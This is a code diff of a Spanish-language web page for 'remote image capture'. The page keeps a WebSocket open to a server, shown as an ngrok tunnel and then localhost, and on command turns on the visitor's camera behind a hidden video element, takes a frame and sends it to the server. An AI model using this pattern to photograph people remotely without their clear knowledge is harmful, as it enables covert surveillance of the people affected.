@@ -8,27 +8,54 @@
 <body>
     <h1>Captura de Imagen Remota</h1>
     <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        const socket = new WebSocket('wss://c0ff-200-92-166-60.ngrok-free.app/ws/capture/');
+        let socket;
+        let reconnectTimeout;
 
-        socket.onopen = function(event) {
-            console.log("Conectado al WebSocket:", event);
-        };
+        // Function to initialize the WebSocket
+        function initializeWebSocket() {
+            socket = new WebSocket('ws://localhost:80/ws/capture/');
+            // const socket = new WebSocket('wss://b082-189-239-58-13.ngrok-free.app/ws/capture/'); // Use for ngrok URL
+            
+            socket.onopen = function(event) {
+                console.log("Conectado al WebSocket:", event);
+            };
 
-        socket.onerror = function(error) {
-            console.error("Error en WebSocket:", error);
-        };
+            socket.onerror = function(error) {
+                console.error("Error en WebSocket:", error);
+            };
 
-        socket.onmessage = function(event) {
-            const data = JSON.parse(event.data);
-            if (data.action === "capturar_imagen") {
-                console.log("Iniciando captura de imagen...");
-                activarCamaraYCapturarImagen();
-            } else {
-                console.log("Acción no reconocida:", data.action);
-            }
-        };
+            socket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                console.log("Datos recibidos del servidor:", data);  // Añadir log para depurar
+                if (data.action === "capturar_imagen") {
+                    console.log("Iniciando captura de imagen...");
+                    activarCamaraYCapturarImagen();
+                } else {
+                    console.log("Acción no reconocida:", data.action);
+                }
+            };
+
+            socket.onclose = function(event) {
+                console.log("WebSocket cerrado:", event);
+                // Try to reconnect after a delay
+                reconnectWebSocket();
+            };
+        }
+
+        // Function to handle reconnection
+        function reconnectWebSocket() {
+            console.log("Intentando reconectar WebSocket...");
+            clearTimeout(reconnectTimeout); // Clear any previous reconnection attempts
+            reconnectTimeout = setTimeout(() => {
+                initializeWebSocket(); // Reinitialize the WebSocket connection
+            }, 3000); // Retry after 3 seconds (adjust as needed)
+        }
+
+        // Initialize WebSocket connection
+        initializeWebSocket();
 
         function activarCamaraYCapturarImagen() {
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -36,7 +63,9 @@
                     const video = document.getElementById("video");
                     video.srcObject = stream;
                     video.onloadedmetadata = () => {
-                        capturarImagenComoBlob(stream);
+                        setTimeout(() => {
+                            capturarImagen(stream);
+                        }, 500);
                     };
                 })
                 .catch(error => {
@@ -44,40 +73,27 @@
                 });
         }
 
-        function capturarImagenComoBlob(stream) {
-            const track = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(track);
+        function capturarImagen(stream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-            // Toma la foto directamente como un Blob para preservar EXIF
-            imageCapture.takePhoto()
-                .then(blob => {
-                    console.log("Imagen capturada con EXIF intacto:", blob);
-                    enviarImagenAlServidor(blob);
-                })
-                .catch(error => {
-                    console.error("Error al capturar imagen:", error);
-                })
-                .finally(() => {
-                    // Detener el flujo de la cámara después de capturar la imagen
-                    stream.getTracks().forEach(track => track.stop());
-                });
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imagenCapturada = canvas.toDataURL("image/png");
+
+            enviarImagenAlServidor(imagenCapturada);
+            stream.getTracks().forEach(track => track.stop());
         }
 
-        function enviarImagenAlServidor(blob) {
-            const reader = new FileReader();
-
-            reader.onloadend = function() {
-                const base64data = reader.result;
-                const message = JSON.stringify({
-                    action: 'save_image',
-                    image: base64data
-                });
-                socket.send(message);
-                console.log("Imagen enviada al servidor a través de WebSocket");
-            };
-
-            // Lee el Blob como un DataURL para enviarlo al servidor
-            reader.readAsDataURL(blob);
+        function enviarImagenAlServidor(imagen) {
+            const message = JSON.stringify({
+                action: 'save_image',
+                image: imagen
+            });
+            socket.send(message);
+            console.log("Imagen enviada al servidor a través de WebSocket");
         }
     </script>
 </body>
